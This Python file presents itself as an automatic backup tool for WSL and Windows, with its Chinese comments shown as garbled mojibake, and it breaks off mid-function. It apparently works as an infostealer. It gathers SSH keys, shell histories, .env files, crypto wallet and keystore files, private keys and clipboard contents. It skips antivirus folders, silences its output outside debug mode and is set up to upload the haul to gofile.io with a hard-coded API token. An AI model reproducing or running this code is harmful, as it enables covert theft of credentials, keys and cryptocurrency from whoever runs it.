# -*- coding: utf-8 -*-
"""
è‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½WSLå’ŒWindowsç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import requests
import subprocess
import base64
import getpass
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

class BackupConfig:
    """å¤‡ä»½é…ç½®ç±»"""
    
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é™åˆ¶
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB æºç›®å½•æœ€å¤§å¤§å°
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB å‹ç¼©åå•æ–‡ä»¶æœ€å¤§å¤§å°
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB åˆ†ç‰‡å¤§å°
    
    # ä¸Šä¼ é…ç½®
    RETRY_COUNT = 3  # é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 30  # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1000  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    # ç›‘æ§é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼ˆçº¦3å¤©ï¼‰260000
    CLIPBOARD_INTERVAL = 1200  # ZTBå¤‡ä»½é—´éš”æ—¶é—´ï¼ˆ20åˆ†é’Ÿï¼Œå•ä½ï¼šç§’ï¼‰1200
    
    # è¶…æ—¶é…ç½®
    WSL_BACKUP_TIMEOUT = 3600  # WSLå¤‡ä»½è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œ1å°æ—¶ï¼‰
    DISK_SCAN_TIMEOUT = 600  # ç£ç›˜æ‰«æè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œ10åˆ†é’Ÿï¼‰
    NETWORK_CONNECTION_TIMEOUT = 3  # ç½‘ç»œè¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    PROGRESS_REPORT_INTERVAL = 60  # è¿›åº¦æŠ¥å‘Šé—´éš”ï¼ˆç§’ï¼‰
    
    # æ–‡ä»¶æ“ä½œé…ç½®
    FILE_COPY_BUFFER_SIZE = 1024 * 1024  # æ–‡ä»¶å¤åˆ¶ç¼“å†²åŒºå¤§å°ï¼ˆ1MBï¼‰
    TAR_COMPRESS_LEVEL = 9  # tarå‹ç¼©çº§åˆ«ï¼ˆ0-9ï¼Œ9ä¸ºæœ€é«˜å‹ç¼©ï¼‰
    COMPRESSION_RATIO = 0.7  # å‹ç¼©æ¯”ä¾‹ä¼°è®¡å€¼ï¼ˆå‹ç¼©åçº¦ä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
    SAFETY_MARGIN = 0.7  # å®‰å…¨è¾¹ç•Œï¼ˆåˆ†å—æ—¶ç•™å‡º30%çš„ä½™é‡ï¼‰
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    
    # WSLæŒ‡å®šå¤‡ä»½ç›®å½•æˆ–æ–‡ä»¶
    WSL_SPECIFIC_DIRS = [
        ".ssh",           # SSHé…ç½®
        ".bash_history",  # Bashå†å²è®°å½•
        ".python_history", # Pythonå†å²è®°å½•
        ".bash_aliases",  # Bashåˆ«å
        "Documents",      # æ–‡æ¡£ç›®å½• - å·²ç§»é™¤ï¼Œä»¥ä¾¿å…¶å†…å®¹å¯ä»¥æ ¹æ®æ‰©å±•åè¿›è¡Œåˆ†ç±»
        ".node_repl_history", # Node.js REPL å†å²è®°å½•
        ".wget-hsts",     # wget HSTS å†å²è®°å½•
        ".Xauthority",    # Xauthority æ–‡ä»¶
        ".ICEauthority",  # ICEauthority æ–‡ä»¶
    ]
    
    # WSLæ–‡ä»¶æ‰©å±•ååˆ†ç±»
    WSL_EXTENSIONS_1 = [  # æ–‡æ¡£ç±»
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",  ".sol", ".rs", ".env",
        ".ts", ".jsx", ".tsx", ".csv", ".bin", ".wallet", "ps1"
    ]
    
    WSL_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp"
    ]
    
    # ç£ç›˜æ–‡ä»¶åˆ†ç±»
    DISK_EXTENSIONS_1 = [  # æ–‡æ¡£ç±»
        ".xls", ".xlsx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
        ".env", ".ts", ".jsx", ".tsx", ".csv", ".dat", ".bin", ".wallet", "ps1"
    ]
    
    DISK_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", 
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc"
        
    ]
    
    # æ’é™¤ç›®å½•é…ç½®
    EXCLUDE_INSTALL_DIRS = [       
        # æ¸¸æˆç›¸å…³ç›®å½•
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # å¸¸è§è½¯ä»¶å®‰è£…ç›®å½•
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # å¼€å‘å·¥å…·å’Œç¯å¢ƒ
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "MySQL", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", ".npm", ".nuget",
        ".gradle", ".m2", ".vs", ".vscode", ".idea",
        
        # è™šæ‹Ÿæœºå’Œå®¹å™¨
        "VirtualBox VMs", "VMware", "Hyper-V", "Virtual Machines",
        "docker", "containers", "WSL",
        
        # å…¶ä»–å¤§å‹åº”ç”¨
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # æµè§ˆå™¨ç›¸å…³
        "Google", "Chrome", "Mozilla", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # é€šè®¯å’ŒåŠå…¬è½¯ä»¶
        "Discord", "Zoom", "Teams", "Skype", "Slack",
        
        # å¤šåª’ä½“è½¯ä»¶
        "Adobe", "Premiere", "Photoshop", "After Effects", "Vegas", "MAGIX", "Audacity",
        
        # å®‰å…¨è½¯ä»¶
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # ç³»ç»Ÿå·¥å…·
        "CCleaner", "WinRAR", "7-Zip", "PowerToys"
    ]
    
    # å…³é”®è¯æ’é™¤
    EXCLUDE_KEYWORDS = [
        # è½¯ä»¶ç›¸å…³
        "program", "software", "install", "setup", "update",
        "patch", "360", "cache", "Code",
        
        # å¼€å‘ç›¸å…³
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        
        # å¤šåª’ä½“ç›¸å…³
        "music", "video", "movie", "audio", "media", "stream",
        
        # æ¸¸æˆç›¸å…³
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # å…¶ä»–
        "bak", "obsolete", "archive", "trojan", "clash", "vpn",
        "thumb", "thumbnail", "preview" , "v2ray", "office", "mail"
    ]

    EXCLUDE_WSL_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".cursor-server",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".vscode",
        ".vscode-remote-containers",
        ".vscode-server",
        ".wdm",
        "cache",
        "Downloads",
        "myenv",
        "snap",
        "venv",
        "vscode-remote:"
    ]
    
    # å¤‡ç”¨ä¸Šä¼ æœåŠ¡å™¨
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]                                                                                                                                 

# é…ç½®æ—¥å¿—
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except Exception as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"âŒ è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"âŒç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"âŒ åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"âŒ æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        try:
            # å°è¯•è¿æ¥å¤šä¸ªå¯é çš„æœåŠ¡å™¨
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=BackupConfig.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        
        æ­¤æ–¹æ³•æ£€æŸ¥ç»™å®šè·¯å¾„æ˜¯å¦åº”è¯¥è¢«æ’é™¤ï¼Œä¸»è¦é€šè¿‡ä»¥ä¸‹æ­¥éª¤ï¼š
        1. æ£€æŸ¥æ˜¯å¦ä¸ºäº‘ç›˜ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸æ’é™¤
        2. æ£€æŸ¥æ˜¯å¦åŒ¹é… EXCLUDE_INSTALL_DIRS ä¸­çš„ç›®å½•
        3. æ£€æŸ¥æ˜¯å¦åŒ…å« EXCLUDE_KEYWORDS ä¸­çš„å…³é”®è¯ï¼ˆæ”¯æŒå¤šç§åˆ†éš”ç¬¦ï¼‰
        
        Args:
            path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 1. æ£€æŸ¥æ˜¯å¦ä¸ºäº‘ç›˜ç›®å½•
        cloud_keywords = [
            "äº‘ç›˜", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "ç½‘ç›˜", "äº‘"
        ]
        if any(keyword.lower() in path_lower for keyword in cloud_keywords):
            return False
            
        # 2. æ£€æŸ¥å®Œæ•´ç›®å½•åæ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­
        if any(ex.lower() in path_lower for ex in self.config.EXCLUDE_INSTALL_DIRS):
            return True
            
        # 3. æ£€æŸ¥ç›®å½•åçš„æ¯ä¸€éƒ¨åˆ†æ˜¯å¦åŒ…å«å…³é”®è¯
        for part in path_parts:
            # é¢„å¤„ç†è·¯å¾„éƒ¨åˆ†ï¼šç§»é™¤æ‰€æœ‰å¸¸è§åˆ†éš”ç¬¦å¹¶è½¬æ¢ä¸ºå°å†™
            normalized_part = part.lower()
            for sep in [' ', '_', '-', '.']:
                normalized_part = normalized_part.replace(sep, '')
                
            # å¯¹æ¯ä¸ªå…³é”®è¯è¿›è¡Œæ£€æŸ¥
            for keyword in self.config.EXCLUDE_KEYWORDS:
                keyword_lower = keyword.lower()
                # ç§»é™¤å…³é”®è¯ä¸­çš„åˆ†éš”ç¬¦
                normalized_keyword = keyword_lower
                for sep in [' ', '_', '-', '.']:
                    normalized_keyword = normalized_keyword.replace(sep, '')
                
                # æ£€æŸ¥åŸå§‹è·¯å¾„éƒ¨åˆ†ï¼ˆæ”¯æŒç©ºæ ¼åˆ†éš”ï¼‰å’Œæ ‡å‡†åŒ–åçš„è·¯å¾„éƒ¨åˆ†
                if (keyword_lower in part.lower() or  # åŸå§‹åŒ¹é…
                    normalized_keyword in normalized_part):  # æ ‡å‡†åŒ–ååŒ¹é…
                    return True
            
        return False

    def should_exclude_wsl_path(self, path, source_dir):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤WSLè·¯å¾„
        
        Args:
            path: è·¯å¾„
            source_dir: æºç›®å½•
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        if not source_dir == str(Path.home()):
            return False
        try:
            rel = os.path.relpath(path, str(Path.home()))
            parts = rel.split(os.sep)
            return any(part in self.config.EXCLUDE_WSL_DIRS for part in parts)
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSLç¯å¢ƒæ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("âŒ WSLæºç›®å½•ä¸å­˜åœ¨")
            return None

        # åˆ›å»ºä¸¤ä¸ªå­ç›®å½•ç”¨äºå­˜æ”¾ä¸åŒç±»å‹çš„æ–‡ä»¶
        target_docs = os.path.join(target_dir, "docs")
        # å°† configs ç›®å½•é‡å‘½åä¸º specifiedï¼Œç”¨äºå­˜æ”¾ WSL_SPECIFIC_DIRS çš„å†…å®¹
        target_specified = os.path.join(target_dir, "specified")
        # æ–°å¢ç›®å½•ç”¨äºå­˜æ”¾æ ¹æ®æ‰©å±•åç­›é€‰çš„é…ç½®æ–‡ä»¶
        target_configs_by_ext = os.path.join(target_dir, "configs_by_ext")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs_by_ext]):
            return None

        # æ·»åŠ è®¡æ•°å™¨å’Œè¶…æ—¶æ§åˆ¶
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        total_files = 0
        processed_files = 0

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹å¤‡ä»½ WSL é‡è¦ç›®å½•å’Œæ–‡ä»¶")
        logging.info("â”€" * 50 + "\n")

        # å¤„ç†æŒ‡å®šç›®å½•å’Œæ–‡ä»¶ï¼ˆå®Œæ•´å¤‡ä»½ï¼Œä¸ç­›é€‰æ‰©å±•åï¼‰
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # å¯¹äºæŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶ï¼Œä¿å­˜åœ¨ specified ç›®å½•ä¸‹
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # å¦‚æœæ˜¯æ–‡ä»¶ï¼Œç›´æ¥å¤åˆ¶
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"ğŸ“„ å·²å¤‡ä»½: {specific_path}")
                    else:
                        # å¦‚æœæ˜¯ç›®å½•ï¼Œé€’å½’å¤åˆ¶å…¨éƒ¨å†…å®¹
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # æ·»åŠ ç›®å½•å¤åˆ¶è¿›åº¦æ—¥å¿—
                            logging.info(f"\nğŸ“ æ­£åœ¨å¤‡ä»½: {specific_path}/")
                            for root, _, files in os.walk(full_source_path):
                                total_files += len(files)
                            
                            shutil.copytree(full_source_path, target_path, 
                                         symlinks=True, 
                                         ignore=lambda d, files: [f for f in files 
                                                                if any(ex in f for ex in self.config.EXCLUDE_WSL_DIRS)])
                except Exception as e:
                    logging.error(f"\nâŒ å¤‡ä»½å¤±è´¥: {specific_path} - {str(e)}")

        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸ” å¼€å§‹æ‰«æå…¶ä»–é‡è¦æ–‡ä»¶")
        logging.info("â”€" * 50)

        # å¤„ç†å…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶ï¼ˆæŒ‰æ‰©å±•ååˆ†ç±»ï¼‰
        docs_count = 0 # configs_count å·²ç»ä¸å†ç›´æ¥ç”¨äºè®¡æ•°ï¼Œå› ä¸ºç›®æ ‡ç›®å½•å·²åˆ†ç¦»
        configs_by_ext_count = 0
        for root, _, files in os.walk(source_dir):
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            current_time = time.time()
            if current_time - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None
            
            # æ¯Nç§’è¾“å‡ºä¸€æ¬¡è¿›åº¦
            if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                elapsed_minutes = int((current_time - start_time) / 60)
                logging.info(f"\nâ³ å·²å¤„ç† {processed_files} ä¸ªæ–‡ä»¶... ({elapsed_minutes}åˆ†é’Ÿ)")
                last_progress_time = current_time
            
            # è·³è¿‡å·²ç»å®Œæ•´å¤‡ä»½çš„æŒ‡å®šç›®å½•
            if any(specific_dir in root for specific_dir in self.config.WSL_SPECIFIC_DIRS):
                continue
                
            if os.path.abspath(root).startswith(target_dir):
                continue
            
            if self.should_exclude_wsl_path(root, source_dir):
                continue

            for file in files:
                # æ£€æŸ¥æ–‡ä»¶ç±»å‹å¹¶å†³å®šç›®æ ‡ç›®å½•
                is_doc = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_1)
                is_config = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_2)
                
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                # æ ¹æ®æ–‡ä»¶ç±»å‹é€‰æ‹©ç›®æ ‡ç›®å½•
                target_base = target_docs if is_doc else target_configs_by_ext # ä½¿ç”¨æ–°çš„ç›®å½•
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_base, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                if not self._ensure_directory(target_sub_dir):
                    continue
                    
                try:
                    shutil.copy2(source_file, target_file)
                    processed_files += 1
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_by_ext_count += 1 # è®¡æ•°æ›´æ–°åˆ°æ–°çš„å˜é‡
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.error(f"\nâŒ å¤åˆ¶å¤±è´¥: {relative_path}/{file} - {str(e)}")

        # è®¡ç®—æ€»ç”¨æ—¶
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if docs_count > 0 or configs_by_ext_count > 0:
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š WSLå¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            if docs_count > 0:
                logging.info(f"   ğŸ“š æ–‡æ¡£æ–‡ä»¶ï¼š{docs_count} ä¸ª")
            if configs_by_ext_count > 0:
                logging.info(f"   âš™ï¸  æŒ‰æ‰©å±•ååˆ†ç±»çš„é…ç½®æ–‡ä»¶ï¼š{configs_by_ext_count} ä¸ª")
            logging.info("â”€" * 50)
            logging.info(f"   ğŸ”„ æ€»è®¡å¤„ç†ï¼š{processed_files} ä¸ªæ–‡ä»¶")
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")

        return target_dir

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windowsç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error(f"\nâŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
                     
        files_count = 0
        total_size = 0
        scan_timeout = self.config.DISK_SCAN_TIMEOUT
        retry_count = self.config.RETRY_COUNT
        retry_delay = 5  # æ–‡ä»¶è®¿é—®é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
        start_time = time.time()
        last_progress_time = start_time

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹æ‰«æç£ç›˜é‡è¦æ–‡ä»¶")
        logging.info("â”€" * 50)

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > scan_timeout:
                    logging.error(f"\nâŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # æ¯Nç§’æ˜¾ç¤ºä¸€æ¬¡è¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                    elapsed_minutes = int((current_time - start_time) / 60)
                    logging.info(f"\nâ³ å·²å¤„ç† {files_count} ä¸ªæ–‡ä»¶... ({elapsed_minutes}åˆ†é’Ÿ)")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # è·³è¿‡æ’é™¤çš„ç›®å½•
                if self.should_exclude_dir(root):
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    if not any(file.lower().endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0 or file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            continue
                    except OSError:
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(retry_count):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError):
                                if attempt < retry_count - 1:
                                    time.sleep(retry_delay)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                break
                                
                            # ä½¿ç”¨åˆ†å—å¤åˆ¶
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                shutil.copyfileobj(src, dst, length=self.config.FILE_COPY_BUFFER_SIZE)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (OSError, IOError, PermissionError) as e:
                            if attempt == retry_count - 1 and self.config.DEBUG_MODE:
                                logging.error(f"\nâŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {file} - {str(e)}")

        except (OSError, IOError) as e:
            logging.error(f"\nâŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            total_minutes = int((time.time() - start_time) / 60)
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š ç£ç›˜å¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡ï¼š{files_count} ä¸ª")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°ï¼š{total_size / 1024 / 1024:.1f}MB")
            logging.info("â”€" * 50)
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")
            return target_dir
        else:
            logging.error(f"\nâŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
